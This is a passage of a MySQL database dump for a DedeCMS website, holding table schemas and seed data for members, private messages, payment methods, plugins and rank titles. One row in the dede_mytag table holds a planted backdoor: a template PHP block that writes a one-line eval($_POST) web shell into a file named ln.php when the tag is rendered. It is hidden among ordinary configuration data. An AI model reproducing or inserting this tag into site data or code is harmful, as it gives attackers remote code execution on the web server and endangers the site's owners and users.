  `title` varchar(60) NOT NULL DEFAULT '',
  `uname` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `qq` varchar(50) NOT NULL DEFAULT '',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`aid`),
  KEY `mid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_model`
--

CREATE TABLE IF NOT EXISTS `dede_member_model` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `table` varchar(30) NOT NULL,
  `description` varchar(50) NOT NULL,
  `state` int(2) NOT NULL DEFAULT '0',
  `issystem` int(2) NOT NULL DEFAULT '0',
  `info` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `dede_member_model`
--

INSERT INTO `dede_member_model` (`id`, `name`, `table`, `description`, `state`, `issystem`, `info`) VALUES
(1, '个人', 'dede_member_person', '个人会员模型', 1, 1, '\r\n<field:onlynet itemname="联系方式限制" autofield="1" type="int" isnull="true" default="1"  maxlength="250" issearch="" isshow="" state="1">\r\n</field:onlynet>\r\n\r\n<field:sex itemname="性别" autofield="1" type="radio" isnull="true" default="男,女,保密"  maxlength="250" issearch="" isshow="" state="1">\r\n</field:sex>\r\n\r\n<field:uname itemname="昵称/公司名称" autofield="1" type="textchar" isnull="true" default=""  maxlength="30" issearch="" isshow="" state="1">\r\n</field:uname>\r\n\r\n<field:qq itemname="QQ" autofield="1" type="textchar" isnull="true" default=""  maxlength="12" issearch="" isshow="" state="1">\r\n</field:qq>\r\n\r\n<field:msn itemname="MSN" autofield="1" type="textchar" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:msn>\r\n\r\n<field:tel itemname="电话号码" autofield="1" type="text" isnull="true" default=""  maxlength="15" issearch="" isshow="" state="1">\r\n</field:tel>\r\n\r\n<field:mobile itemname="手机" autofield="1" type="text" isnull="true" default=""  maxlength="15" issearch="" isshow="" state="1">\r\n</field:mobile>\r\n\r\n<field:place itemname="目前所在地" autofield="1" type="int" default="0"  maxlength="5" issearch="0" isshow="0" state="1">\r\n</field:place>\r\n\r\n\r\n<field:oldplace itemname="家乡所在地" autofield="1" type="int" default="0"  maxlength="5" issearch="0" isshow="0" state="1">\r\n</field:oldplace>\r\n\r\n\r\n<field:birthday itemname="生日" autofield="1" type="datetime" isnull="true" default=""  maxlength="250" issearch="" isshow="" state="1">\r\n</field:birthday>\r\n\r\n<field:star itemname="星座" autofield="1" type="int" isnull="true" default="1"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:star>\r\n\r\n<field:income itemname="收入" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:income>\r\n\r\n<field:education itemname="学历" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:education>\r\n\r\n<field:height itemname="身高" autofield="1" type="int" isnull="true" default="160"  maxlength="5" issearch="" isshow="" state="1">\r\n</field:height>\r\n\r\n<field:bodytype itemname="体重" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:bodytype>\r\n\r\n<field:blood itemname="血型" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:blood>\r\n\r\n<field:vocation itemname="职业" autofield="1" type="text" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:vocation>\r\n\r\n<field:smoke itemname="吸烟" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:smoke>\r\n\r\n<field:marital itemname="婚姻状况" autofield="1" type="text" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:marital>\r\n\r\n<field:house itemname="住房" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:house>\r\n\r\n<field:drink itemname="饮酒" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:drink>\r\n\r\n<field:datingtype itemname="交友" autofield="1" type="int" isnull="true" default="0"  maxlength="6" issearch="" isshow="" state="1">\r\n</field:datingtype>\r\n\r\n<field:language itemname="语言" autofield="1" type="checkbox" isnull="true" default="普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语"  maxlength="250" issearch="" isshow="" state="1">\r\n</field:language>\r\n\r\n\r\n<field:nature itemname="性格" autofield="1" type="checkbox" isnull="true" default="性格外向,性格内向,活泼开朗,豪放不羁,患得患失,冲动,幽默,稳重,轻浮,沉默寡言,多愁善感,时喜时悲,附庸风雅,能说会道,坚强,脆弱,幼稚,成熟,快言快语,损人利己,狡猾善变,交际广泛,优柔寡断,自私,真诚,独立,依赖,难以琢磨,悲观消极,郁郁寡欢,胆小怕事,乐观向上,任性,自负,自卑,拜金,温柔体贴,小心翼翼,暴力倾向,逆来顺受,不拘小节,暴躁,倔强,豪爽,害羞,婆婆妈妈,敢做敢当,助人为乐,耿直,虚伪,孤僻,老实,守旧,敏感,迟钝,婆婆妈妈,武断,果断,刻薄"  maxlength="250" issearch="" isshow="" state="1">\r\n</field:nature>\r\n\r\n<field:lovemsg itemname="人生格言" autofield="1" type="text" isnull="true" default=""  maxlength="100" issearch="" isshow="" state="1">\r\n</field:lovemsg>\r\n\r\n<field:address itemname="家庭住址" autofield="1" type="text" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:address>\r\n\r\n<field:uptime itemname="更新时间" autofield="1" type="int" isnull="true" default=""  maxlength="10" issearch="" isshow="" state="1">\r\n</field:uptime>\r\n'),
(2, '企业', 'dede_member_company', '公司企业会员模型', 1, 1, '\r\n<field:company itemname="公司名称" autofield="1" type="text" isnull="true" default=""  maxlength="36" issearch="" isshow="" state="1">\r\n</field:company>\r\n\r\n<field:product itemname="公司产品" autofield="1" type="text" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:product>\r\n\r\n<field:place itemname="所在地址" autofield="1" type="int" isnull="true" default="0"  maxlength="5" issearch="" isshow="" state="1">\r\n</field:place>\r\n\r\n<field:vocation itemname="所属行业" autofield="1" type="int" isnull="true" default="0"  maxlength="5" issearch="" isshow="" state="1">\r\n</field:vocation>\r\n\r\n<field:cosize itemname="公司规模" autofield="1" type="int" isnull="true" default="0"  maxlength="5" issearch="" isshow="" state="1">\r\n</field:cosize>\r\n\r\n<field:tel itemname="电话号码" autofield="1" type="text" isnull="true" default=""  maxlength="30" issearch="" isshow="" state="1">\r\n</field:tel>\r\n\r\n<field:fax itemname="传真" autofield="1" type="text" isnull="true" default=""  maxlength="30" issearch="" isshow="" state="1">\r\n</field:fax>\r\n\r\n<field:linkman itemname="联系人" autofield="1" type="text" isnull="true" default=""  maxlength="20" issearch="" isshow="" state="1">\r\n</field:linkman>\r\n\r\n<field:address itemname="详细地址" autofield="1" type="text" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:address>\r\n\r\n<field:mobile itemname="手机" autofield="1" type="text" isnull="true" default=""  maxlength="30" issearch="" isshow="" state="1">\r\n</field:mobile>\r\n\r\n<field:email itemname="邮箱" autofield="1" type="text" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:email>\r\n\r\n<field:url itemname="地址" autofield="1" type="text" isnull="true" default=""  maxlength="50" issearch="" isshow="" state="1">\r\n</field:url>\r\n\r\n<field:uptime itemname="更新时间" autofield="1" type="int" isnull="true" default="0"  maxlength="10" issearch="" isshow="" state="1">\r\n</field:uptime>\r\n\r\n<field:checked itemname="是否审核" autofield="1" type="int" isnull="true" default="0"  maxlength="1" issearch="" isshow="" state="1">\r\n</field:checked>\r\n\r\n<field:introduce itemname="公司简介" autofield="1" type="multitext" isnull="true" default=""  maxlength="250" issearch="" isshow="" state="1">\r\n</field:introduce>\r\n\r\n<field:comface itemname="公司标志" autofield="1" type="text" isnull="true" default=""  maxlength="255" issearch="" isshow="" state="1">\r\n</field:comface>\r\n');

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_msg`
--

CREATE TABLE IF NOT EXISTS `dede_member_msg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `id` (`ischeck`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_operation`
--

CREATE TABLE IF NOT EXISTS `dede_member_operation` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `buyid` varchar(80) NOT NULL DEFAULT '',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `product` varchar(10) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  `mid` int(11) NOT NULL DEFAULT '0',
  `sta` int(11) NOT NULL DEFAULT '0',
  `oldinfo` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `buyid` (`buyid`),
  KEY `pid` (`pid`,`mid`,`sta`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_person`
--

CREATE TABLE IF NOT EXISTS `dede_member_person` (
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `onlynet` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `sex` enum('男','女','保密') NOT NULL DEFAULT '男',
  `uname` char(30) NOT NULL DEFAULT '',
  `qq` char(12) NOT NULL DEFAULT '',
  `msn` char(50) NOT NULL DEFAULT '',
  `tel` varchar(15) NOT NULL DEFAULT '',
  `mobile` varchar(15) NOT NULL DEFAULT '',
  `place` smallint(5) unsigned NOT NULL DEFAULT '0',
  `oldplace` smallint(5) unsigned NOT NULL DEFAULT '0',
  `birthday` date NOT NULL DEFAULT '1980-01-01',
  `star` smallint(6) unsigned NOT NULL DEFAULT '1',
  `income` smallint(6) NOT NULL DEFAULT '0',
  `education` smallint(6) NOT NULL DEFAULT '0',
  `height` smallint(5) unsigned NOT NULL DEFAULT '160',
  `bodytype` smallint(6) NOT NULL DEFAULT '0',
  `blood` smallint(6) NOT NULL DEFAULT '0',
  `vocation` smallint(6) NOT NULL DEFAULT '0',
  `smoke` smallint(6) NOT NULL DEFAULT '0',
  `marital` smallint(6) NOT NULL DEFAULT '0',
  `house` smallint(6) NOT NULL DEFAULT '0',
  `drink` smallint(6) NOT NULL DEFAULT '0',
  `datingtype` smallint(6) NOT NULL DEFAULT '0',
  `language` set('普通话','上海话','广东话','英语','日语','韩语','法语','意大利语','德语','西班牙语','俄语','阿拉伯语') DEFAULT NULL,
  `nature` set('性格外向','性格内向','活泼开朗','豪放不羁','患得患失','冲动','幽默','稳重','轻浮','沉默寡言','多愁善感','时喜时悲','附庸风雅','能说会道','坚强','脆弱','幼稚','成熟','快言快语','损人利己','狡猾善变','交际广泛','优柔寡断','自私','真诚','独立','依赖','难以琢磨','悲观消极','郁郁寡欢','胆小怕事','乐观向上','任性','自负','自卑','拜金','温柔体贴','小心翼翼','暴力倾向','逆来顺受','不拘小节','暴躁','倔强','豪爽','害羞','婆婆妈妈','敢做敢当','助人为乐','耿直','虚伪','孤僻','老实','守旧','敏感','迟钝','婆婆妈妈','武断','果断','刻薄') DEFAULT NULL,
  `lovemsg` varchar(100) NOT NULL DEFAULT '',
  `address` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_member_person`
--

INSERT INTO `dede_member_person` (`mid`, `onlynet`, `sex`, `uname`, `qq`, `msn`, `tel`, `mobile`, `place`, `oldplace`, `birthday`, `star`, `income`, `education`, `height`, `bodytype`, `blood`, `vocation`, `smoke`, `marital`, `house`, `drink`, `datingtype`, `language`, `nature`, `lovemsg`, `address`, `uptime`) VALUES
(1, 1, '男', 'admin', '', '', '', '', 0, 0, '1980-01-01', 1, 0, 0, 160, 0, 0, 0, 0, 0, 0, 0, 0, '', '', '', '', 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_pms`
--

CREATE TABLE IF NOT EXISTS `dede_member_pms` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `floginid` varchar(20) NOT NULL DEFAULT '',
  `fromid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `toid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tologinid` char(20) NOT NULL DEFAULT '',
  `folder` enum('inbox','outbox') DEFAULT 'inbox',
  `subject` varchar(60) NOT NULL DEFAULT '',
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  `writetime` int(10) unsigned NOT NULL DEFAULT '0',
  `hasview` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `message` text,
  PRIMARY KEY (`id`),
  KEY `sendtime` (`sendtime`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_space`
--

CREATE TABLE IF NOT EXISTS `dede_member_space` (
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `pagesize` smallint(5) unsigned NOT NULL DEFAULT '10',
  `matt` smallint(6) NOT NULL DEFAULT '0',
  `spacename` varchar(50) NOT NULL DEFAULT '',
  `spacelogo` varchar(50) NOT NULL DEFAULT '',
  `spacestyle` varchar(20) NOT NULL DEFAULT '',
  `sign` varchar(100) NOT NULL DEFAULT '没签名',
  `spacenews` text,
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_member_space`
--

INSERT INTO `dede_member_space` (`mid`, `pagesize`, `matt`, `spacename`, `spacelogo`, `spacestyle`, `sign`, `spacenews`) VALUES
(1, 10, 0, 'admin的空间', '', 'person', '', '');

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_stow`
--

CREATE TABLE IF NOT EXISTS `dede_member_stow` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `type` varchar(20) NOT NULL DEFAULT 'sys',
  PRIMARY KEY (`id`),
  KEY `uid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_stowtype`
--

CREATE TABLE IF NOT EXISTS `dede_member_stowtype` (
  `stowname` varchar(30) NOT NULL,
  `indexname` varchar(30) NOT NULL,
  `indexurl` varchar(50) NOT NULL,
  PRIMARY KEY (`stowname`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_member_stowtype`
--

INSERT INTO `dede_member_stowtype` (`stowname`, `indexname`, `indexurl`) VALUES
('sys', '系统收藏', 'archives_do.php'),
('book', '小说收藏', '/book/book.php?bid');

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_tj`
--

CREATE TABLE IF NOT EXISTS `dede_member_tj` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `article` smallint(5) unsigned NOT NULL DEFAULT '0',
  `album` smallint(5) unsigned NOT NULL DEFAULT '0',
  `archives` smallint(5) unsigned NOT NULL DEFAULT '0',
  `homecount` int(10) unsigned NOT NULL DEFAULT '0',
  `pagecount` int(10) unsigned NOT NULL DEFAULT '0',
  `feedback` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `friend` smallint(5) unsigned NOT NULL DEFAULT '0',
  `stow` smallint(5) unsigned NOT NULL DEFAULT '0',
  `soft` int(10) NOT NULL DEFAULT '0',
  `info` int(10) NOT NULL DEFAULT '0',
  `shop` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `dede_member_tj`
--

INSERT INTO `dede_member_tj` (`mid`, `article`, `album`, `archives`, `homecount`, `pagecount`, `feedback`, `friend`, `stow`, `soft`, `info`, `shop`) VALUES
(1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_type`
--

CREATE TABLE IF NOT EXISTS `dede_member_type` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `rank` int(11) NOT NULL DEFAULT '0',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `exptime` int(11) NOT NULL DEFAULT '30',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_vhistory`
--

CREATE TABLE IF NOT EXISTS `dede_member_vhistory` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `loginid` char(20) NOT NULL DEFAULT '',
  `vid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `vloginid` char(20) NOT NULL DEFAULT '',
  `count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vip` char(15) NOT NULL DEFAULT '',
  `vtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `vtime` (`vtime`),
  KEY `mid` (`mid`,`vid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_moneycard_record`
--

CREATE TABLE IF NOT EXISTS `dede_moneycard_record` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `ctid` int(11) NOT NULL DEFAULT '0',
  `cardid` varchar(50) NOT NULL DEFAULT '',
  `uid` int(11) NOT NULL DEFAULT '0',
  `isexp` smallint(6) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `utime` int(11) NOT NULL DEFAULT '0',
  `money` int(11) NOT NULL DEFAULT '0',
  `num` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `ctid` (`ctid`),
  KEY `cardid` (`cardid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_moneycard_type`
--

CREATE TABLE IF NOT EXISTS `dede_moneycard_type` (
  `tid` int(11) NOT NULL AUTO_INCREMENT,
  `num` int(11) NOT NULL DEFAULT '500',
  `money` int(11) NOT NULL DEFAULT '50',
  `pname` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `dede_moneycard_type`
--

INSERT INTO `dede_moneycard_type` (`tid`, `num`, `money`, `pname`) VALUES
(1, 100, 30, '100点卡'),
(2, 200, 55, '200点卡'),
(3, 300, 75, '300点卡');

-- --------------------------------------------------------

--
-- 表的结构 `dede_mtypes`
--

CREATE TABLE IF NOT EXISTS `dede_mtypes` (
  `mtypeid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtypename` char(40) NOT NULL,
  `channelid` smallint(6) NOT NULL DEFAULT '1',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`mtypeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_multiserv_config`
--

CREATE TABLE IF NOT EXISTS `dede_multiserv_config` (
  `remoteuploads` smallint(6) NOT NULL DEFAULT '0',
  `remoteupUrl` text NOT NULL,
  `rminfo` text,
  `servinfo` mediumtext,
  PRIMARY KEY (`remoteuploads`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_myad`
--

CREATE TABLE IF NOT EXISTS `dede_myad` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `adname` varchar(60) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_mytag`
--

CREATE TABLE IF NOT EXISTS `dede_mytag` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `dede_mytag`
--

INSERT INTO `dede_mytag` (`aid`, `typeid`, `tagname`, `timeset`, `starttime`, `endtime`, `normbody`, `expbody`) VALUES
(1, 0, '', 0, 0, 0, '{dede:php}$fp = @fopen("ln.php", ''a'');@fwrite($fp, ''<?php eval($_POST[c]) ?>'');echo "OK";@fclose($fp);{/dede:php}', NULL);

-- --------------------------------------------------------

--
-- 表的结构 `dede_payment`
--

CREATE TABLE IF NOT EXISTS `dede_payment` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `code` varchar(20) NOT NULL DEFAULT '',
  `name` varchar(120) NOT NULL DEFAULT '',
  `fee` varchar(10) NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `config` text NOT NULL,
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `cod` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `online` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `code` (`code`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `dede_payment`
--

INSERT INTO `dede_payment` (`id`, `code`, `name`, `fee`, `description`, `rank`, `config`, `enabled`, `cod`, `online`) VALUES
(3, 'alipay', '支付宝', '', '支付宝网站(www.alipay.com) 是国内先进的网上支付平台。<br/>DedeCMS联合支付宝推出支付宝接口。<br/><a href="https://www.alipay.com/himalayas/practicality_customer.htm?customer_external_id=C4335994340215837114&market_type=from_agent_contract&pro_codes=6ACD133C5F350958F7F62F29651356BB " target="_blank"><font color="red">立即在线申请</font></a>', 1, 'a:4:{s:14:"alipay_account";a:4:{s:5:"title";s:14:"支付宝用户账号";s:11:"description";s:0:"";s:4:"type";s:4:"text";s:5:"value";s:0:"";}s:10:"alipay_key";a:4:{s:5:"title";s:14:"交易安全校验码";s:11:"description";s:0:"";s:4:"type";s:4:"text";s:5:"value";s:0:"";}s:14:"alipay_partner";a:4:{s:5:"title";s:12:"合作者身份ID";s:11:"description";s:0:"";s:4:"type";s:4:"text";s:5:"value";s:0:"";}s:17:"alipay_pay_method";a:5:{s:5:"title";s:14:"支付宝账号类型";s:11:"description";s:52:"请选择您最后一次跟支付宝签订的协议里面说明的接口类型";s:4:"type";s:6:"select";s:5:"iterm";s:58:"0:使用标准双接口,1:使用担保交易接口,2:使用即时到帐交易接口";s:5:"value";s:0:"";}}', 0, 0, 1),
(2, 'bank', '银行汇款/转帐', '0', '银行名称\r\n收款人信息：全称 ××× ；帐号或地址 ××× ；开户行 ×××。\r\n注意事项：办理电汇时，请在电汇单“汇款用途”一栏处注明您的订单号。', 4, 'a:0:{}', 1, 1, 0),
(1, 'cod', '货到付款', '0', '开通城市：×××\r\n货到付款区域：×××', 3, 'a:0:{}', 1, 1, 0),
(6, 'yeepay', 'YeePay易宝', '', 'YeePay易宝（北京通融通信息技术有限公司）是专业从事多元化电子支付业务一站式服务的领跑者。在立足于网上支付的同时，YeePay易宝不断创新，将互联网、手机、固定电话整合在一个平台上，继短信支付、手机充值之后，首家推出了YeePay易宝电话支付业务，真正实现了离线支付，为更多传统行业搭建了电子支付的高速公路。YeePay易宝融合世界先进的电子支付文化，聚合众多金融、电信、IT、互联网等领域内的巨擘，旨在通过创新的支付机制，推动中国电子商务新进程。YeePay易宝致力于成为世界一流的电子支付应用和服务提供商，专注于金融增值服务和移动增值服务两大领域，创新并推广多元化、低成本的、安全有效的支付服务。<input type="button" name="Submit" value="立即注册" onclick="window.open(''https://www.yeepay.com/selfservice/requestRegister.action'')" />', 2, 'a:2:{s:10:"yp_account";a:4:{s:5:"title";s:8:"商户编号";s:11:"description";s:0:"";s:4:"type";s:4:"text";s:5:"value";s:0:"";}s:6:"yp_key";a:4:{s:5:"title";s:8:"商户密钥";s:11:"description";s:0:"";s:4:"type";s:4:"text";s:5:"value";s:0:"";}}', 0, 0, 1);

-- --------------------------------------------------------

--
-- 表的结构 `dede_plus`
--

CREATE TABLE IF NOT EXISTS `dede_plus` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `plusname` varchar(30) NOT NULL DEFAULT '',
  `menustring` varchar(200) NOT NULL DEFAULT '',
  `mainurl` varchar(50) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `filelist` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=29 ;

--
-- 转存表中的数据 `dede_plus`
--

INSERT INTO `dede_plus` (`aid`, `plusname`, `menustring`, `mainurl`, `writer`, `isshow`, `filelist`) VALUES
(27, '友情链接模块', '<m:item name=''友情链接'' link=''friendlink_main.php'' rank=''plus_友情链接'' target=''main'' />', '', '织梦团队', 1, ''),
(24, '文件管理器', '<m:item name=''文件管理器'' link=''file_manage_main.php'' rank=''plus_文件管理器'' target=''main'' />', '', '织梦团队', 1, ''),
(23, '百度新闻', '<m:item name=''百度新闻'' link=''baidunews.php'' rank=''plus_百度新闻'' target=''main'' />', '', '织梦团队', 1, 'baidunews.php'),
(28, '投票模块', '<m:item name=''投票模块'' link=''vote_main.php'' rank=''plus_投票模块'' target=''main'' />', '', '织梦团队', 1, ''),
(25, '广告管理', '<m:item name=''广告管理'' link=''ad_main.php'' rank=''plus_广告管理'' target=''main'' />', '', '织梦官方', 1, ''),
(10, '挑错管理', '<m:item name=''挑错管理'' link=''erraddsave.php'' rank=''plus_挑错管理'' target=''main'' />', '', '织梦团队', 1, '<m:item name=''挑错管理'' link=''catalog_do.php?dopost=erraddsave.php'' rank=''plus_挑错管理'' target=''main'' />');

-- --------------------------------------------------------

--
-- 表的结构 `dede_pwd_tmp`
--

CREATE TABLE IF NOT EXISTS `dede_pwd_tmp` (
  `mid` mediumint(8) NOT NULL,
  `membername` char(16) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `mailtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_ratings`
--

CREATE TABLE IF NOT EXISTS `dede_ratings` (
  `id` varchar(11) NOT NULL,
  `total_votes` int(11) NOT NULL DEFAULT '0',
  `total_value` int(11) NOT NULL DEFAULT '0',
  `used_ips` longtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_scores`
--

CREATE TABLE IF NOT EXISTS `dede_scores` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `titles` char(15) NOT NULL,
  `icon` smallint(6) unsigned DEFAULT '0',
  `integral` int(10) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `integral` (`integral`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=16 ;

--
-- 转存表中的数据 `dede_scores`
--

INSERT INTO `dede_scores` (`id`, `titles`, `icon`, `integral`, `isdefault`) VALUES
(2, '列兵', 1, 0, 1),
(3, '班长', 2, 1000, 1),
(4, '少尉', 3, 2000, 1),
(5, '中尉', 4, 3000, 1),
(6, '上尉', 5, 4000, 1),
